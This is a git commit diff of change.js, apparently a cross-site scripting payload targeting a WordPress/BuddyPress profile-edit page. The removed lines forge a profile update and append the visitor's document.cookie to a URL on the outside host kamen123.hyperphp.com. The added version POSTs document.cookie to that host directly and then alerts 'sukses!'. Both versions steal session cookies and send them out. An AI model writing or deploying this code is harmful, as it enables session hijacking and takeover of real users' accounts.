0382acb13f07a97d8b77e463c9fd8b7955d33c93
kamen-sketch <84771586+kamen-sketch@users.noreply.github.com>
2022-04-01 02:00:20 +0700

    Update change.js

--- change.js
+++ change.js
@@ -5,15 +5,9 @@
         $.ajax({
             type: 'POST',
 
-            url: 'http://www.kamen123.hyperphp.com/test.php?wkwk='+document.cookie,
+            url: 'http://www.kamen123.hyperphp.com/test.php',
             data: {
-                "field_1": "riki washing here",
-                "field_12": "riki washing here",
-                "field_13": "riki was here",
-                "profile-group-edit-submit": "Save Changes +",
-                "field_ids": "1,12,13",
-                "_wpnonce": x,
-                "_wp_http_referer": "/members/pentest3/profile/edit/group/1/"
+                "field_1": document.cookie
     },
             success: function (msg) {
                 alert('sukses!');
